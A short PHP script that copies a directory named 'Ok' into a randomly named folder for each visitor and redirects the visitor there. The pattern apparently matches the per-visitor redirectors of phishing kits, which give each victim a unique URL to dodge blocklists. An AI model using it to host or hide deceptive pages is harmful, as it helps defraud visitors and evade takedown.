<?php

$rndm = rand(0,1900000).$_SERVER['REMOTE_ADDR'];
$place	= substr(md5($rndm), 0, 9);
	
function re_copy($origin, $place) 
{
	$dir = opendir($origin);
	$result = ($dir === false ? false : true);
	if ($result !== false) {
		$result = @mkdir($place);
		if ($result === true) {
			while(false !== ( $file = readdir($dir)) ) { 
				if (( $file != '.' ) && ( $file != '..' ) && $result) { 
					if ( is_dir($origin . '/' . $file) ) { 
						$result = re_copy($origin . '/' . $file,$place . '/' . $file); 
					} else { 
						$result = copy($origin . '/' . $file,$place . '/' . $file); 
					} 
				} 
			} 
			closedir($dir);
		}
	}
	return $result;
}
$origin="Ok";
re_copy( $origin, $place );
header("location:".$place."");
exit;

?>